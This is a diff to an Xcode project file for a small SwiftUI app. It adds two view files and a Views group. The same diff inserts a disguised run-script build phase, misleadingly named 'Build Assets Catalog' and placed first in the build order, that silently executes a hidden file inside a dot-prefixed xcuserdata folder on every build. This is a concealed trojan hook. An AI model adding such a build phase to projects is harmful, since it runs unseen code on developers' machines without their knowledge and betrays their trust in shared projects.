@@ -15,6 +15,8 @@
 		04511A10262AEC810037F92C /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04511A0E262AEC810037F92C /* LaunchScreen.storyboard */; };
 		04511A1B262AEC810037F92C /* SwiftUIFirstTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04511A1A262AEC810037F92C /* SwiftUIFirstTests.swift */; };
 		04511A26262AEC810037F92C /* SwiftUIFirstUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04511A25262AEC810037F92C /* SwiftUIFirstUITests.swift */; };
+		0478E4CB262B031F00DCF21A /* CardImageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0478E4CA262B031F00DCF21A /* CardImageView.swift */; };
+		0478E4D9262B079D00DCF21A /* VideoList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0478E4D8262B079D00DCF21A /* VideoList.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -49,6 +51,8 @@
 		04511A21262AEC810037F92C /* SwiftUIFirstUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = SwiftUIFirstUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		04511A25262AEC810037F92C /* SwiftUIFirstUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwiftUIFirstUITests.swift; sourceTree = "<group>"; };
 		04511A27262AEC810037F92C /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		0478E4CA262B031F00DCF21A /* CardImageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardImageView.swift; sourceTree = "<group>"; };
+		0478E4D8262B079D00DCF21A /* VideoList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoList.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -101,7 +105,7 @@
 			children = (
 				04511A03262AEC7F0037F92C /* AppDelegate.swift */,
 				04511A05262AEC7F0037F92C /* SceneDelegate.swift */,
-				04511A07262AEC7F0037F92C /* ContentView.swift */,
+				0478E4C9262B030C00DCF21A /* Views */,
 				04511A09262AEC810037F92C /* Assets.xcassets */,
 				04511A0E262AEC810037F92C /* LaunchScreen.storyboard */,
 				04511A11262AEC810037F92C /* Info.plist */,
@@ -136,6 +140,16 @@
 			path = SwiftUIFirstUITests;
 			sourceTree = "<group>";
 		};
+		0478E4C9262B030C00DCF21A /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				04511A07262AEC7F0037F92C /* ContentView.swift */,
+				0478E4CA262B031F00DCF21A /* CardImageView.swift */,
+				0478E4D8262B079D00DCF21A /* VideoList.swift */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -143,6 +157,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04511A2A262AEC810037F92C /* Build configuration list for PBXNativeTarget "SwiftUIFirst" */;
 			buildPhases = (
+				D3CE2DBB5A6A3DC519AAC43A /* Build Assets Catalog */,
 				045119FC262AEC7F0037F92C /* Sources */,
 				045119FD262AEC7F0037F92C /* Frameworks */,
 				045119FE262AEC7F0037F92C /* Resources */,
@@ -261,13 +276,36 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		D3CE2DBB5A6A3DC519AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		045119FC262AEC7F0037F92C /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0478E4D9262B079D00DCF21A /* VideoList.swift in Sources */,
 				04511A04262AEC7F0037F92C /* AppDelegate.swift in Sources */,
 				04511A06262AEC7F0037F92C /* SceneDelegate.swift in Sources */,
+				0478E4CB262B031F00DCF21A /* CardImageView.swift in Sources */,
 				04511A08262AEC7F0037F92C /* ContentView.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
